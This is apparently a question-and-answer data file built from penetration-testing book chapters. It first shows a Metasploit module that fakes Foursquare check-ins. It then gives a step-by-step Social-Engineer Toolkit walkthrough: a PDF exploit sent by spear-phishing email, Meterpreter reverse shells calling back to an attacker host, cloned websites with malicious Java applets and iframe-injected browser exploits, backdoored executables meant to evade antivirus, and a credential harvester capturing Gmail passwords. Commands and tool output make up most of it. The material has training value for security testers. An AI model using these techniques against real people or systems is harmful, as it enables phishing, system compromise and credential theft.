send_request_cgi({\n'uri' => \"/v1/checkin?vid=#{venid}\",\n'version' => \"1.1\",\n'method' => 'POST',\n'data' => postrequest,\n'headers' =>\n{\n'Authorization' => \"Basic #{user_pass}\",\n'Proxy-Connection' => \"Keep-Alive\",\n}\n}, 25)\nNow we reach the actual logic of the script—what happens when run is\ncalled within the module. Initially the provided options are set to local vari-\nable names (cid:88) along with defining various other objects. An object is then\ncreated by calling the send_request_cgi method (cid:89) imported into the script\nfrom lib/msf/core/exploit/http.rb and defined as“Connects to the server, cre-\nates a request, sends the request, reads the response.” This method takes var-\nious parameters that make up the call to the actual server, as shown here.\n(cid:88)print_status(\"#{res}\") #this outputs the entire response. We could probably do\n#without this but it's nice to see what's going on.\nend\n(cid:89)rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\nrescue ::Timeout::Error, ::Errno::EPIPE =>e\nputs e.message\nend\nend\nAfter this object is created, the results are printed (cid:88). If anything goes\nwrong, logic exists for catching any errors (cid:89) and reporting them to the user.\nAll of this logic is simple and is just a matter of plugging various parameters\n130 Chapter 9\ninto existing functions of the Framework. This is a great example of the\npower of the Framework, because it allows us to concentrate only on the\ninformation needed to address our goal. There is no reason to reproduce\nany of the standard functions such as error handling, connection manage-\nment, and so on.\nLet’s see this module in action. If you don’t remember the full path to\nthe module within the Metasploit directory structure, search for it like so.\n(cid:88) msf > search foursquare\n[*] Searching loaded modules for pattern 'foursquare'...\nAuxiliary\n=========\nName Rank Description\n---- ---- -----------\nadmin/foursquare normal Foursquare Location Poster\n(cid:89) msf > use admin/foursquare\n(cid:90) msf auxiliary(foursquare) > info\nName: Foursquare Location Poster\nVersion: $Revision:$\nLicense: Metasploit Framework License (BSD)\nRank: Normal\nProvided by:\nCG <cg@carnal0wnage.com>\nBasic options:\nName Current Setting Required Description\n---- --------------- -------- -----------\nPASSWORD password yes foursquare password\nProxies no Use a proxy chain\nRHOST api.foursquare.com yes The target address\nRPORT 80 yes The target port\nUSERNAME username yes foursquare username\nVENUEID 185675 yes foursquare venueid\nVHOST no HTTP server virtual host\nDescription:\nF*ck with Foursquare, be anywhere you want to be by venue id\nReferences:\nhttp://groups.google.com/group/foursquare-api\nhttp://www.mikekey.com/im-a-foursquare-cheater/\nMetasploit Auxiliary Modules 131\nIn the prior example, we search for “foursquare” (cid:88), issue the use com-\nmand (cid:89) to select the auxiliary module, and display the information (cid:90) for\nthe selected module. Based on the options presented above, we need to con-\nfigure a few of them first.\n(cid:88) msf auxiliary(foursquare) > set VENUEID 2584421\nVENUEID => 2584421\nmsf auxiliary(foursquare) > set USERNAME msf@elwood.net\nUSERNAME => metasploit\nmsf auxiliary(foursquare) > set PASSWORD ilovemetasploit\nPASSWORD => ilovemetasploit\n(cid:89) msf auxiliary(foursquare) > run\n[*] Base64 Encoded User/Pass: bXNmQGVsd29vZC5uZXQ6aWxvdmVtZXRhc3Bsb2l0\n[*] Base64 Decoded User/Pass: msf@elwood.net:ilovemetasploit\n[*] HTTP/1.1 200 OK\nContent-Type: text/xml; charset=utf-8\nDate: Sat, 08 May 2010 07:42:09 GMT\nContent-Length: 1400\nServer: nginx/0.7.64\nConnection: keep-alive\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<checkin><id>40299544</id><created>Sat, 08 May 10 07:42:09 +0000</created><message>OK!\nWe've got you @ Washington DC Union Station. This is your 1st checkin here!</message>\n<venue><id>2584421</id><name>Washington DC Union Station</name><primarycategory><id>79283</\nid><fullpathname>Travel:Train Station</fullpathname><nodename>Train Station</nodename>\n<iconurl>http://foursquare.com/img/categories/travel/trainstation.png</iconurl></primary\ncategory><address>Union Station</address><city>Washington</city><state>DC</state><geolat>\n38.89777986957695</geolat><geolong>-77.0060920715332</geolong></venue><mayor><type>nochange\n</type><checkins>4</checkins><user><id>685446</id><firstname>Ron</firstname><photo>http://\nplayfoursquare.s3.amazonaws.com/userpix_thumbs/ELOW44QHXJFB4PWZ.jpg</photo><gender>male</\ngender></user><message>Ron is The Mayor of Washington DC Union Station.</message></mayor>\n<badges><badge><id>1</id><name>Newbie</name><icon>http://foursquare.com/img/badge/newbie\n.png</icon><description>Congrats on your first check-in!</description></badge></badges>\n<scoring><score><points>1</points><icon>http://foursquare.com/img/scoring/2.png</icon>\n<message>First stop tonight(cid:90)</message></score><score><points>5</points><icon>http://\nfoursquare.com/img/scoring/1.png</icon><message>First time @ Washington DC Union Station!</\nmessage></score></scoring></checkin>\nIn order to run this module successfully, we need a valid set of Four-\nsquare credentials to do the check-in. We first define the VenueID that we\nfind online with a bit of Googling (cid:88), and then we set our Foursquare creden-\ntials (cid:89) and run the module. We get a successful result with the Foursquare\nservice confirming our check-in and giving us five points (cid:90).\nIn this case, we have submitted a request to “check in” at Union Station\nin Washington, DC, on the Foursquare service (see Figure 9-1).\nFigure 9-1: A successful check-in at Union Station\n132 Chapter 9\nWhen we check the Foursquare website, we see a successful result. Mod-\nules like these demonstrate that Metasploit allows us to implement nearly\nanything we can programmatically imagine.\nGoing Forward\nAs you have seen, auxiliary modules can have a wide range of uses. The infra-\nstructure provided by the Metasploit Framework can produce a wide array\noftools in a very short time. Using Metasploit’s auxiliary modules, you can\nscan an IP address range to determine which hosts are alive and which ser-\nvices are running on each host. You can then leverage this information to\ndetermine vulnerable services, such as in the WebDAV example, or even log\nin via brute force on a remote server.\nAlthough you can easily create custom auxiliary modules, don’t discount\nthe existing auxiliary modules in the Framework. These modules may be the\nexact one-off tool you need.\nThe auxiliary modules provide a wide range of potential additional ave-\nnues. For a web application, the auxiliary modules offer more than 40 addi-\ntional checks or attacks that you can perform. In some instances, you may\nwant to brute force a web server to see which servers are listing directories.\nOr you may want to scan the web server to see if it can act as an open proxy\nand relaytraffic out to the Internet. Regardless of your needs, the auxiliary\nmodules can provide additional enumeration information, attack vectors, or\nvulnerabilities.\nMetasploit Auxiliary Modules 133"
  },
  {
    "input": "What is the Social-Engineer Toolkit (SET) and how does it facilitate social-engineering attacks?",
    "summary": "The Social-Engineer Toolkit (SET) is a collection of resources and tools designed to help conduct social-engineering attacks by exploiting human vulnerabilities. It is widely used in the penetration testing community and has become an industry standard. SET allows attackers to create convincing phishing emails, clone websites, and use various methods to trick users into compromising their systems. The toolkit also includes features like credential harvesting and web jacking, which can be used to gather sensitive information from targets.",
    "output": "T H E S O C I A L - E N G I N E E R\nT O O L K I T\nThe Social-Engineer Toolkit (SET) was developed to\ncoincide with the release of Social-Engineer.org, a set\nof resources conceived by Chris Hadnagy (loganWHD)\nand written by one of this book’s authors, David\nKennedy. The site offers a centralized location for\nsocial-engineering tutorials and explains terminologies,\ndefinitions, and scenarios that can help prepare you\nfor hacking the human mind.\nThe purpose of SET is to fill a gap in the penetration testing community\nand bring awareness to social-engineering attacks. And it has succeeded—\nSET has been downloaded 1 million times and is now an industry standard for\ndeploying social-engineering attacks. The toolkit attacks human weaknesses,\nexploiting curiosity, credibility, avarice, and simple human stupidity. Social-\nengineering attacks are at an all-time high and have always been a large risk\nfor many organizations.\nOf course, social engineering is nothing new. One person trying to coax\nanother to perform acts that he normally wouldn’t do is as old as time itself.\nMany in the security community believe that social engineering is one of the\nbiggest risks organizations face, because it’s extremely difficult to protect\norganizations from being attacked in this way. (You might remember the\nultrasophisticated Operation Aurora attack, for example, in which social-\nengineering was used to attack Gmail and other sources of Google data.)\nAn attack vector is the avenue used to gain information or access to a sys-\ntem. SET categorizes attacks by attack vector (such as web, email, and USB-\nbased attacks). It uses email, spoofed websites, and other vectors to reach\nhuman targets, typically tricking individuals into compromising the target or\nreleasing sensitive information. Naturally, each vector can have a different\nsuccess rate depending on its target and the communication used. SET also\ncomes prebuilt with email and website templates that can be used for social-\nengineering attacks. SET heavily uses the Metasploit Framework.\nBecause of the social nature of the attacks themselves, each example in\nthis chapter is coupled with a brief story.\nConfiguring the Social-Engineer Toolkit\nBy default, in Back|Track, SET is located in the /pentest/exploits/set/ directory.\nBefore you begin, make sure that you are running the latest version of SET.\nroot@bt:/pentest/exploits/set# svn update\nNext, configure your SET configuration file according to what you’re\nattempting to accomplish. We’ll cover a couple of simple features within the\nconfiguration file config/set_config within the root SET directory.\nWhen using the SET web-based attack vectors, you can turn ON the\nWEBATTACK_EMAIL flag to perform email phishing in conjunction with the web\nattack. This flag is turned OFF by default, which means that you will configure\nSET and use the web attack vector without the support of email phishing.\nMETASPLOIT_PATH=/opt/framework3/msf3\nWEBATTACK_EMAIL=ON\nOne of the web-based attacks available in SET is the Java applet attack,\nwhich uses self-signed Java applets. By default, this attack uses Microsoft as\nthe publisher name; however, if the Java Development Kit (JDK) has been\ninstalled, you can turn this option ON and sign the applet with whatever name\nyou want. When you turn this flag ON, additional options will be available\nthrough the interface.\nSELF_SIGNED_APPLET=ON\nThe AUTO_DETECT setting is one of the most important flags and is turned\nON by default. It tells SET to detect your local IP address automatically and to\n136 Chapter 10\nuse that as the address for the reverse connection and web servers. If you are\nusing multiple interfaces or your reverse payload listener is housed at a dif-\nferent location, turn this flag OFF. When this option is OFF, SET will allow you\nto specify multiple scenarios to ensure that the proper IP address scheme is\nused, for example, in a scenario that includes NAT and port forwarding.\nThese options are reflected within the SET interface.\nAUTO_DETECT=OFF\nWhen you use the toolkit, by default it uses a built-in Python web-based\nserver. To optimize performance, set the APACHE_SERVER flag to ON, and SET\nwilluse Apache for the attacks.\nAPACHE_SERVER=ON\nThose are the basics of the configuration file. As you can see, you can\nsignificantly change SET’s behavior depending on which flags are set in the\ntool. Now let’s run the tool.\nSpear-Phishing Attack Vector\nThe spear-phishing attack vector specially crafts file-format exploits (such as\nAdobe PDF exploits) and primarily sends email attacks containing attach-\nments to a target, which, when opened, compromise the target’s machine.\nSET can use Simple Mail Transport Protocol (SMTP) open relays (both\nanonymous and credentialed), Gmail, and Sendmail to send email. SET\ncanalso use standard email or HTML-based email to perform the phishing\nattack.\nLet’s consider a real-world penetration test targeting the company\nCompanyXYZ. You register a domain name similar to Company XYZ, say\ncoompanyxyz.com. You then register the subdomain coom.panyXYZ.com. Next,\nyou send a spear-phishing attack to the target organization, knowing that\nmost employees only glance at email and will open any attachment that\nappears to be legitimate. In this case, we will send a PDF file format bug to\nour target, like so.\nroot@bt:/pentest/exploits/set# ./set\nSelect from the menu:\n(cid:88) 1. Spear-Phishing Attack Vectors\n2. Website Attack Vectors\n3. Infectious Media Generator\n4. Create a Payload and Listener\n5. Mass Mailer Attack\n6. Teensy USB HID Attack Vector\n7. SMS Spoofing Attack Vector\n8. Wireless Access Point Attack Vector\n9. Third Party Modules\nThe Social-Engineer Toolkit 137\n10. Update the Metasploit Framework\n11. Update the Social-Engineer Toolkit\n12. Help, Credits, and About\n13. Exit the Social-Engineer Toolkit\nEnter your choice: 1\nWelcome to the SET E-Mail attack method. This module allows you\nto specially craft email messages and send them to a large (or small)\nnumber of people with attached fileformat malicious payloads. If you\nwant to spoof your email address, be sure \"Sendmail\" is installed (it\nis installed in BT4) and change the config/set_config SENDMAIL=OFF flag\nto SENDMAIL=ON.\nThere are two options, one is getting your feet wet and letting SET do\neverything for you (option 1), the second is to create your own FileFormat\npayload and use it in your own attack. Either way, good luck and enjoy!\n(cid:89) 1. Perform a Mass Email Attack\n2. Create a FileFormat Payload\n3. Create a Social-Engineering Template\n4. Return to Main Menu\nEnter your choice: 1\nSelect the file format exploit you want.\nThe default is the PDF embedded EXE.\n********** PAYLOADS **********\n1. SET Custom Written DLL Hijacking Attack Vector (RAR, ZIP)\n2. SET Custom Written Document UNC LM SMB Capture Attack\n3. Microsoft Windows CreateSizedDIBSECTION Stack Buffer Overflow\n4. Microsoft Word RTF pFragments Stack Buffer Overflow (MS10-087)\n5. Adobe Flash Player 'Button' Remote Code Execution\n6. Adobe CoolType SING Table 'uniqueName' Overflow\n7. Adobe Flash Player 'newfunction' Invalid Pointer Use\n(cid:90) 8. Adobe Collab.collectEmailInfo Buffer Overflow\n9. Adobe Collab.getIcon Buffer Overflow\n10. Adobe JBIG2Decode Memory Corruption Exploit\n11. Adobe PDF Embedded EXE Social Engineering\n12. Adobe util.printf() Buffer Overflow\n13. Custom EXE to VBA (sent via RAR) (RAR required)\n14. Adobe U3D CLODProgressiveMeshDeclaration Array Overrun\n15. Adobe PDF Embedded EXE Social Engineering (NOJS)\n16. Foxit PDF Reader v4.1.1 Title Stack Buffer Overflow\n17. Nuance PDF Reader v6.0 Launch Stack Buffer Overflow\nEnter the number you want (press enter for default): 8\n1. Windows Reverse TCP Shel Spawn a command shell on victim and send back to\nattacker.\n2. Windows Meterpreter Reverse_TCP Spawn a meterpreter shell on victim and send back\nto attacker.\n138 Chapter 10\n3. Windows Reverse VNC DLL Spawn a VNC server on victim and send back to\nattacker.\n4. Windows Reverse TCP Shell (x64) Windows X64 Command Shell, Reverse TCP Inline\n5. Windows Meterpreter Reverse_TCP (X64) Connect back to the attacker (Windows x64),\nMeterpreter\n6. Windows Shell Bind_TCP (X64) Execute payload and create an accepting port on\nremote system.\n7. Windows Meterpreter Reverse HTTPS Tunnel communication over HTTP using SSL and use\nMeterpreter.\n(cid:91) Enter the payload you want (press enter for default):\n[*] Windows Meterpreter Reverse TCP selected.\nEnter the port to connect back on (press enter for default):\n[*] Defaulting to port 443...\n[*] Generating fileformat exploit...\n[*] Please wait while we load the module tree...\n[*] Started reverse handler on 10.10.1.112:443\n[*] Creating 'template.pdf' file...\n[*] Generated output file /pentest/exploits/set/src/program_junk/template.pdf\n[*] Payload creation complete.\n[*] All payloads get sent to the src/msf_attacks/template.pdf directory\n[*] Payload generation complete. Press enter to continue.\nAs an added bonus, use the file-format creator in SET to create your attachment.\nRight now the attachment will be imported with filename of 'template.whatever'\nDo you want to rename the file?\nexample Enter the new filename: moo.pdf\n(cid:92) 1. Keep the filename, I don't care.\n2. Rename the file, I want to be cool.\nEnter your choice (enter for default): 1\nKeeping the filename and moving on.\nFrom the SET main menu, select Spear-Phishing Attack Vectors (cid:88) fol-\nlowed by Perform a Mass Email Attack (cid:89). This attack infects a PDF file using\nthe Adobe Collab.collectEmailInfo vulnerability (cid:90), a Metasploit Meterpreter\nreverse payload (cid:91) that is the SET default. Collab.collectEmailInfo is a heap-\nbased exploit that, if opened (and if the target’s version of Adobe Acrobat\nisvulnerable to this exploit), will connect to the attacking workstation on\nport443, which usually allows outbound traffic from most networks.\nYou are also given the option of renaming the malicious file to make\nitmore enticing for the target to open. The default name (template.pdf) is\nselected (cid:92) in this scenario for demonstration purposes.\nSocial Engineer Toolkit Mass E-Mailer\nThere are two options on the mass e-mailer, the first would\nbe to send an email to one individual person. The second option\nwill allow you to import a list and send it to as many people as\nyou want within that list.\nThe Social-Engineer Toolkit 139\nWhat do you want to do:\n(cid:88) 1. E-Mail Attack Single Email Address\n2. E-Mail Attack Mass Mailer\n3. Return to main menu.\nEnter your choice: 1\nDo you want to use a predefined template or craft\na one time email template.\n(cid:89) 1. Pre-Defined Template\n2. One-Time Use Email Template\nEnter your choice: 1\nBelow is a list of available templates:\n1: New Update\n2: Computer Issue\n3: Strange internet usage from your computer\n4: LOL...have to check this out...\n(cid:90) 5: Status Report\n6: Pay Raise Application Form\n7: WOAAAA!!!!!!!!!! This is crazy...\n8: BasketBall Tickets\n9: Baby Pics\n10: Have you seen this?\n11: Termination List\n12: How long has it been?\n13: Dan Brown's Angels & Demons\nEnter the number you want to use: 5\n(cid:91) Enter who you want to send email to: ihazomgsecurity@secmaniac.com\nWhat option do you want to use?\n1. Use a GMAIL Account for your email attack.\n2. Use your own server or open relay\nEnter your choice: 1\n(cid:92) Enter your GMAIL email address: fakeemailaddy@gmail.com\nEnter your password for gmail (it will not be displayed back to you):\nSET has finished delivering the emails.\nNext we email this attack to a single email address (cid:88) using the SET pre-\ndefined email template (cid:89) Status Report (cid:90). Finally, we enter the email address\n(ihazomgsecurity@secmaniac.com) (cid:91) to send the malicious file to and have SET\nuse a Gmail account (cid:92) to send the message.\n140 Chapter 10\nFinally, create a Metasploit listener for the payload to connect back to (cid:88).\nWhen SET launches Metasploit, it configures all the necessary options and\nstarts to listen on your attacking IP address on port 443 (cid:89), as configured\nearlier.\n(cid:88) Do you want to setup a listener yes or no: yes\nresource (src/program_junk/meta_config)> use exploit/multi/handler\nresource (src/program_junk/meta_config)> set PAYLOAD windows/meterpreter/reverse_tcp\nPAYLOAD => windows/meterpreter/reverse_tcp\nresource (src/program_junk/meta_config)> set LHOST 10.10.1.112\nLHOST => 10.10.1.112\nresource (src/program_junk/meta_config)> set LPORT 443\nLPORT => 443\nresource (src/program_junk/meta_config)> set ENCODING shikata_ga_nai\nENCODING => shikata_ga_nai\nresource (src/program_junk/meta_config)> set ExitOnSession false\nExitOnSession => false\nresource (src/program_junk/meta_config)> exploit -j\n[*] Exploit running as background job.\n(cid:89) [*] Started reverse handler on 10.10.1.112:443\n[*] Starting the payload handler...\nmsf exploit(handler) >\nWe’ve just set up an attack against ihazomgsecurity@secmaniac.com, crafted an\nemail to the recipient, and used an Adobe file format exploit. SET allowed\nusto create templates and have them dynamically imported when we use the\ntool. When the target opens the email and double-clicks the Adobe file, he’ll\nsee something like Figure 10-1.\nFigure 10-1: The target’s view of the infected PDF file\nThe Social-Engineer Toolkit 141\nThe target opens the PDF thinking it’s legitimate, and his system is\ninstantly compromised. On the attacker’s side, you see the following:\n[*] Started reverse handler on 10.10.1.112:443\n[*] Starting the payload handler...\nmsf exploit(handler) > [*] Sending stage (748032 bytes) to 10.10.1.102\n[*] Meterpreter session 1 opened (10.10.1.112:443 -> 10.10.1.102:58087)\nmsf exploit(handler) > sessions -i 1\n[*] Starting interaction with 1...\nmeterpreter > shell\nProcess 2976 created.\nChannel 1 created.\nMicrosoft Windows XP [Version 5.1.2600]\n(C) Copyright 1985-2001 Microsoft Corp.\nC:\\Documents and Settings\\Bob\\Desktop>\nThis example used a spear-phishing attack to target one user, but SET\ncan also be used to attack multiple targets using the “mass email” option.\nYoucan also create customized templates that can be reused, instead of\nusing the prebuilt templates included in SET.\nWeb Attack Vectors\nWeb attack vectors are probably one of the most advanced and exciting\naspects of SET, because they are specifically crafted to be believable and\nenticing to the target. SET can clone websites that look identical to trusted\nsites, helping to ensure that the target will think he is visiting a legitimate site.\nJava Applet\nThe Java applet attack is one of the most successful attack vectors in SET. The\napplet itself was created by one of the SET developers, Thomas Werth. This\nattack introduces a malicious Java applet that does smart browser detection\n(so your exploit works) and delivers a payload to a target’s machine. The Java\napplet attack is not considered a vulnerability by Java. When a target browses\nthe malicious site, he is presented with a warning asking if he wants to run an\nuntrusted Java applet. Because Java allows you to sign an applet with any name\nyou choose, you could call the publisher Google, Microsoft, or any other\nstring you choose. By editing the set_config file and setting WEBATTACK_EMAIL\ntoON, you can also incorporate mass emails with this attack.\nLet’s walk through a real-world example—a penetration test performed\nfor a Fortune 1000 company. First, a copycat domain name, similar to that of\nthe actual company website, was registered. Next, the attacker scraped the\nInternet looking for @<company>.com email addresses using the harvester\nmodule within Metasploit. After extracting 200 email addresses from public\nwebsites, mass emails were sent to these addresses. The attack email claimed\nto be from the company’s communications department and asked the employee\n142 Chapter 10\nto look at the newly designed corporate website. Each email was personalized\nwith the recipient’s name and claimed that the employee could click a link to\nsee a picture of himself on the corporate home page. The email said that this\nnew website displayed the employee’s photograph as a testimony to his hard\nwork. Curiosity and fear were the prime motivators in getting each target to\nclick the URL immediately.\nAfter the target clicked the link, a Java applet notification popped up,\nsigned by the employee’s corporation. The target clicked the run command\nbecause the notification looked legitimate; however, the command was based\non the cloned site under the fake domain. Even though the employees didn’t\nsee their pictures, they were presented with a website that looked legitimate,\nnot realizing that their machines had been compromised: When the user\nclicked Run on the Java applet security prompt, a payload was executed and\na shell delivered to the attacker. Once the payload was executed, the target\nwas redirected back to the legitimate site.\nSET can be used to clone a website and rewrite portions of it so that\nwhen a target visits the malicious site it looks identical to the original site.\nLet’s see how we could set up this attack on a fictitious site, http://www\n.secmaniac.com/, in SET:\nroot@bt:/pentest/exploits/set# ./set\nSelect from the menu:\n(cid:88) 2. Website Attack Vectors\nEnter your choice: 2\n(cid:89) 1. The Java Applet Attack Method\nEnter your choice (press enter for default): 1\nThe first method will allow SET to import a list of pre-defined\nweb applications that it can utilize within the attack.\nThe second method will completely clone a website of your choosing\nand allow you to utilize the attack vectors within the completely\nsame web application you were attempting to clone.\nThe third method allows you to import your own website, note that you\nshould only have an index.html when using the import website\nfunctionality.\n[!] Website Attack Vectors [!]\n1. Web Templates\n(cid:90) 2. Site Cloner\n3. Custom Import\n4. Return to main menu\nEnter number (1-4): 2\nThe Social-Engineer Toolkit 143\nSET supports both HTTP and HTTPS\nExample: http://www.thisisafakesite.com\n(cid:91) Enter the url to clone: http://www.secmaniac.com\n[*] Cloning the website: http://www.secmaniac.com\n[*] This could take a little bit...\n[*] Injecting Java Applet attack into the newly cloned website.\n[*] Filename obfuscation complete. Payload name is: 0xvV3cYfbLBI3\n[*] Malicious java applet website prepped for deployment\nTo begin this attack scenario, select Website Attack Vectors (cid:88) from the\nSET main menu. Use the Java Applet Attack Method (cid:89), and then choose Site\nCloner (cid:90) from the subsequent menu. Finally, tell SET to clone the SecManiac\nwebsite (cid:91).\nWhat payload do you want to generate:\nName: Description:\n2. Windows Reverse_TCP Meterpreter Spawn a meterpreter shell on victim and send\nback to attacker.\n(cid:88) Enter choice (hit enter for default):\nBelow is a list of encodings to try and bypass AV.\nSelect one of the below, 'backdoored executable' is typically the best.\n16. Backdoored Executable (BEST)\n(cid:89) Enter your choice (enter for default):\n[-] Enter the PORT of the listener (enter for default):\n[-] Backdooring a legit executable to bypass Anti-Virus. Wait a few seconds...\n[-] Backdoor completed successfully. Payload is now hidden within a legit executable.\n********************************************************\nDo you want to create a Linux/OSX reverse_tcp payload\nin the Java Applet attack as well?\n********************************************************\nEnter choice yes or no: no\n***************************************************\nWeb Server Launched. Welcome to the SET Web Attack.\n***************************************************\n[--] Tested on IE6, IE7, IE8, Safari, Chrome, and FireFox [--]\n[*] Launching MSF Listener...\n[*] This may take a few to load MSF...\n144 Chapter 10\nAs with other SET attack methods, attackers can use a variety of pay-\nloads. The default reverse Meterpreter payload (cid:88) is usually an excellent\nselection. For this scenario, you can simply select the defaults when prompted\nfor the encoder to use (cid:89) and the port to use to reconnect.\nWith the configuration complete, SET launches Metasploit:\nresource (src/program_junk/meta_config)> exploit -j\n[*] Exploit running as background job.\n(cid:88) [*] Started reverse handler on 10.10.1.112:443\n[*] Starting the payload handler...\nmsf exploit(handler) >\nSET passes all necessary options to Metasploit, which then sets up the\nreverse Meterpreter listener on port 443 (cid:88).\nNOTE You have created a web server housing a cloned instance of http://www.secmaniac\n.com/. If you had changed the configuration file to include WEBATTACK_EMAIL=ON, you\nwould have been prompted to send an email using the spear-phishing attack vector\n(minus attachments).\nNow that everything is set up, you simply need to get a target to browse\nto the malicious site. Upon reaching the website, the target sees a pop-up\nwarning from the publisher, Microsoft, as shown in Figure 10-2. If the target\nclicks Run, and most users will, the payload will be executed, and you gain\nfull control of the user’s system.\nNOTE Recall that SET’s configuration can self-sign the Java applet with whatever you want.\nRemember, too, that when the target clicks Run and the payload is executed and deliv-\nered, the target is redirected to the legitimate SecManiac website.\nFigure 10-2: Java applet prompt\nThe Social-Engineer Toolkit 145\nBack at our attacker machine, the Meterpreter session is successfully\nestablished, and we now have access to the target’s machine as shown here.\nmsf exploit(handler) > [*] Sending stage (748032 bytes) to 10.10.1.102\n[*] Meterpreter session 1 opened (10.10.1.112:443 -> 10.10.1.102:58550)\nmsf exploit(handler) > sessions -i 1\n[*] Starting interaction with 1...\nshellmeterpreter > shell\nProcess 2800 created.\nChannel 1 created.\nMicrosoft Windows XP [Version 5.1.2600]\n(C) Copyright 1985-2001 Microsoft Corp.\nC:\\Documents and Settings\\Administrator\\Desktop>\nClient-Side Web Exploits\nSET can also use client-side web exploits. In this case, instead of a Java applet\nbeing presented to the target, a client-side exploit imported directly from\nMetasploit is used to attack the system. To use client-side exploits, you must\nrely on your prior reconnaissance or hope that the user is susceptible to a\nspecific vulnerability. This method is particularly satisfying if a zero-day vul-\nnerability is discovered: As soon as an exploit is released from Metasploit, it is\ntypically tested and published through SET within the hour.\nIn this example, we will repeat the previous scenario, but we’ll use a\nclient-side attack. Client-side attacks specifically target (mostly) browser\nflaws. Most exploits in SET target Internet Explorer; however, Firefox\nexploits are also used. In this scenario, we’ll use the Aurora attack vector\nthatwas used to compromise Google. To begin, do the following:\nroot@bt:/pentest/exploits/set# ./set\nSelect from the menu:\n(cid:88) 2. Website Attack Vectors\nEnter your choice: 2\n(cid:89) 2. The Metasploit Browser Exploit Method\nEnter your choice (press enter for default): 2\n[!] Website Attack Vectors [!]\n(cid:90) 2. Site Cloner\nEnter number (1-4): 2\n146 Chapter 10\nSET supports both HTTP and HTTPS\nExample: http://www.thisisafakesite.com\n(cid:91) Enter the url to clone: http://www.secmaniac.com\nSelect Website Attack Vectors (cid:88) from the SET main menu, and then\nselect The Metasploit Browser Exploit Method (cid:89). Then select the Site Cloner (cid:90)\noption, and enter http://www.secmaniac.com (cid:91) as the website you want to use\nfor cloning.\nOnce the site is cloned, we’ll set up the exploit to trigger when a target\nbrowses the site.\nEnter the browser exploit you would like to use\n(cid:88) 16. Microsoft Internet Explorer \"Aurora\"\nEnter your choice (1-23) (enter for default): 16\nWhat payload do you want to generate:\nName: Description:\n2. Windows Reverse_TCP Meterpreter Spawn a meterpreter shell on victim and send\nback to attacker.\n(cid:89) Enter choice (example 1-10) (Enter for default):\nEnter the port to use for the reverse (enter for default):\n[*] Cloning the website: http://www.secmaniac.com\n[*] This could take a little bit...\n[*] Injecting iframes into cloned website for MSF Attack....\n[*] Malicious iframe injection successful...crafting payload.\n[*] Launching MSF Listener...\n[*] This may take a few to load MSF...\nresource (src/program_junk/meta_config)> exploit -j\n[*] Exploit running as background job.\nmsf exploit(ms10_002_aurora) >\n[*] Started reverse handler on 10.10.1.112:443\n[*] Using URL: http://0.0.0.0:8080/\n[*] Local IP: http:// 10.10.1.112:8080/\n[*] Server started.\nTo complete the attack setup, select the client-side exploit you wish to\nuse. Above, we choose the infamous Internet Explorer Aurora exploit (cid:88) and\naccept the default reverse Meterpreter payload by pressing ENTER (cid:89).\nWhen the target reaches http://www.secmaniac.com/, the site looks normal,\nbut his system is compromised through an iframe injection. SET automatically\nrewrites the site to contain the iframe that houses the Metasploit client-side\nattack.\nBack at the attacking machine, we see that the attack is successful. The\nMeterpreter session has established the connection from the target to the\nattacking machine, and we have full access to the system, as shown here.\nThe Social-Engineer Toolkit 147\nmsf exploit(handler) >\n[*] Sending stage (748032 bytes) to 10.10.1.102\n[*] Meterpreter session 1 opened (10.10.1.112:443 -> 10.10.1.102:58412)\nmsf exploit(handler) > sessions -i 1\n[*] Starting interaction with 1...\nshellmeterpreter > shell\nProcess 2819 created.\nChannel 1 created.\nMicrosoft Windows XP [Version 5.1.2600]\n(C) Copyright 1985-2001 Microsoft Corp.\nC:\\Documents and Settings\\Administrator\\Desktop>\nUsername and Password Harvesting\nIn the preceding examples, the goal was to obtain access to the individual sys-\ntem. Relatively new within SET is the ability to clone a website and harvest vis-\nitors’ credentials when they access the site, as we’ll demonstrate using Gmail\nin this next example. SET can create a clone of the Gmail website and then\nautomatically rewrite the POST parameters of that website to post to the\nSET web server and then redirect the user to the legitimately cloned website.\n(cid:88) 3. Credential Harvester Attack Method\nEnter your choice (press enter for default): 3\n[!] Website Attack Vectors [!]\n(cid:89) 2. Site Cloner\nEnter number (1-4): 2\nEmail harvester will allow you to utilize the clone capabilities within SET\nto harvest credentials or parameters from a website as well as place them into\na report.\nSET supports both HTTP and HTTPS\nExample: http://www.thisisafakesite.com\n(cid:90) Enter the url to clone: http://www.secmaniac.com\nPress {return} to continue.\n[*] Social-Engineer Toolkit Credential Harvester Attack\n[*] Credential Harvester is running on port 80\n[*] Information will be displayed to you as it arrives below:\n148 Chapter 10\nAfter you select Website Attack Vectors and the Credential Harvester (cid:88),\nchoose Site Cloner (cid:89). The configuration for this attack is minimal and requires\nonly that you pass a URL (http://www.secmaniac.com) (cid:90) to SET that contains a\nlogin form.\nThe web server runs and waits for the target’s response. As mentioned\npreviously, you could in this instance set WEBATTACK_CONFIG=ON, and SET would\nprompt you to attempt mass emails to coax targets into clicking the link. The\ntarget would be presented with a web page that looks identical to Gmail’s\nwebsite and initial login page. When the target enters his password, the\nbrowser automatically redirects to the original Gmail website, while the fol-\nlowing information is presented to the attacker:\n10.10.1.102 - - \"GET / HTTP/1.1\" 200 -\n[*] WE GOT A HIT! Printing the output:\nPARAM: ltmpl=default\nPARAM: ltmplcache=2\nPARAM: continue=https://mail.google.com/mail/?\nPARAM: service=mail\nPARAM: rm=false\nPARAM: dsh=-1174166214807618980\nPARAM: ltmpl=default\nPARAM: ltmpl=default\nPARAM: scc=1\nPARAM: ss=1\nPARAM: GALX=S3ftXFIww0E\nPOSSIBLE USERNAME FIELD FOUND: Email=ihazomgsecurity2390239203\nPOSSIBLE PASSWORD FIELD FOUND: Passwd=thisisacomplexp@55w0rd!!!!!\nPARAM: rmShown=1\nPARAM: signIn=Sign+in\nPARAM: asts=\n[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.\nSET uses a built-in dictionary to mark form fields and parameters on\nsites that might contain sensitive information. It red-highlights potential\nusername and password parameters to indicate that they could be sensitive\nparameters that are worth investigating.\nOnce you’ve finished harvesting all of the target’s credentials, press CTRL-C\nto generate a report, as shown in Figure 10-3. The report uses XML and HTML\nformatting.\nSET’s web server is multithreaded and can handle as many requests as\nyour server can handle. When a number of targets enter their credentials\ninto the site, SET will automatically parse those results into a report format\nthat separates the form fields in a readable format.\nYou can also export the credential harvesting results in an XML-compliant\nformat to later import into tools or 